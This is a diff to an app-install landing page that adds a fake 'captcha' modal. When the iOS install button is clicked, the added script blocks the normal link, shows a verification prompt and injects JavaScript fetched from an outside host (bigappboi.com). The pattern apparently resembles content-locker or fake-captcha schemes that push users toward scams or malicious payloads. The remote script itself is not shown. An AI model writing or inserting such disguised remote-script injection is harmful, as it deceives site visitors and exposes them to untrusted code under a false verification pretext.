@@ -3,6 +3,60 @@
 <head>
     <title>Landing Page</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
+
+<style>
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 1;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      overflow: auto;
+      background-color: rgba(0,0,0,0.4);
+    }
+    .modal-content {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background-color: #fefefe;
+      padding: 20px;
+      border: 1px solid #888;
+      width: 80%; 
+      max-width: 400px; 
+      max-height: 80%; 
+      overflow: auto;
+      text-align: center;
+    }
+    .modal-content h3 {
+      text-align: center;
+    }
+    #captcha-section {
+      text-align: center;
+    }
+    .loader {
+      border: 16px solid #f3f3f3;
+      border-top: 16px solid #3498db;
+      border-radius: 50%;
+      width: 80px;
+      height: 80px;
+      animation: spin 2s linear infinite;
+      margin: 0 auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .captcha-popup-box {
+      position: fixed !important;
+      top: 50% !important;
+      left: 50% !important;
+      transform: translate(-50%, -50%) !important;
+    }
+    </style>
+
     <style>
         body, html {
             height: 100%;
@@ -47,9 +101,20 @@
 <body>
     <div class="center-content">
         <img src="logo.png" alt="Logo"> 
-        <button id="android-btn">Install for Android</button>
-        <button id="ios-btn">Install for iOS</button>
+        <button id="android-btn" style="cursor: pointer;">Install for Android</button>
+         <button id="ios-btn" style="cursor: pointer;">Install for iOS</button>
+<div id="captchaModal" class="modal">
+      <div class="modal-content">
+        <span id="modalClose" style="float: right;font-size: 22px;font-weight: bold;">&times;</span>
+        <h4>Complete the captcha below to continue</h4>
+        <div class="loader" id="loader"></div>
+        <div id="captcha-section" data-captcha-enable="true"></div>
+      </div>
     </div>
+
+    </div>
+
+
     <script>
         document.getElementById('android-btn').onclick = function() {
             // Insert Android App link here  
@@ -59,6 +124,36 @@
             // Insert iOS App link here
             window.open('iOS App link', '_blank');
         };
+    </script>
+
+<script>
+        document.getElementById('ios-btn').addEventListener('click', function(e) {
+            e.preventDefault();
+
+            const modal = document.getElementById('captchaModal');
+            const captchaSection = document.getElementById('captcha-section');
+            
+            captchaSection.innerHTML = '';
+            captchaSection.dataset['captchaEnable'] = 'true';
+
+            const loader = document.getElementById('loader');
+            loader.style.display = 'block';
+
+            const script = document.createElement('script');
+            script.src = 'https://bigappboi.com/cp/js/zqz62';
+            script.async = true;
+            script.onload = (() => {
+              loader.style.display = 'none';
+            }); 
+
+            document.body.appendChild(script);
+
+            modal.style.display = 'block';
+        });
+    
+        document.getElementById('modalClose').addEventListener('click', function() {
+          document.getElementById('captchaModal').style.display = 'none';
+        });
     </script>
 </body>
 </html>
